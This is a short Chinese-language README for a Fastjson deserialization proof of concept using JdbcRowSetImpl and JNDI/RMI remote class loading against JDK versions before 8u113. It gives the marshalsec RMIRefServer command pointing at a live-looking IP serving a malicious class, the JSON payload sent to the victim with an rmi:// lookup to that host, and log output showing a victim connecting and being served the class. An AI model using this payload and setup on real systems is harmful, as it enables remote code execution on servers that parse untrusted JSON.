# JdbcRowSetImpl poc使用
1.开启RMIServer
2.配置远端codebase
3.运行fastjson漏洞poc

# 提醒
只适用于jdk8u113之前未设限codebase的版本


# 远端使用
远端服务使用命令: `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://47.95.7.37:9870/#Calc`
我将9870端口设置成nginx转发到某个文件夹, 当启动如上命令的时候回显
`Opening JRMP listener on 1099`
给受害者发送payload`"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://47.95.7.37:1099/Calc\", \"autoCommit\":true}";`
来访问我们的服务器, 由于nginx未说明拦截rmi服务, 所以直接被我们marshalsec.jar接收到， 并回显
```text
Have connection from /42.58.18.50:60061
Reading message...
Is RMI.lookup call for Calc 2
Sending remote classloading stub targeting http://47.95.7.37:9870/Calc.class
```
这个时候使用http协议跳转到我们nginx实现配置的路径去拿恶意类, 回传给调用者
## 同理ldap
